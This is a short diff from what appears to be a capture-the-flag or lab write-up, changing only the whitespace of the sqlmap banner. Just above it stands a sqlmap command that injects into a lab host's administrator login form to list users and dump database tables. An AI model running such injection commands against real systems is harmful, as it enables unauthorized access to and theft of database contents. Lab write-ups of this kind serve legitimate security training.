@@ -114,9 +114,9 @@
 - **sqlmap**
        
        kali@kali:~$ sqlmap -v -u http://10.10.85.135/administrator.php  --data 'username=&password=' -users -T --dump
-             ___
-            __H__                                                                               
-      ___ ___[.]_____ ___ ___  {1.4.10#stable}                                                           
+              ___
+             __H__                                                                               
+       ___ ___[.]_____ ___ ___  {1.4.10#stable}                                                           
       |_ -| . [)]     | .'| . |                                                                            
       |___|_  [,]_|_|_|__,|  _|                                                                                  
             |_|V...       |_|   http://sqlmap.org  
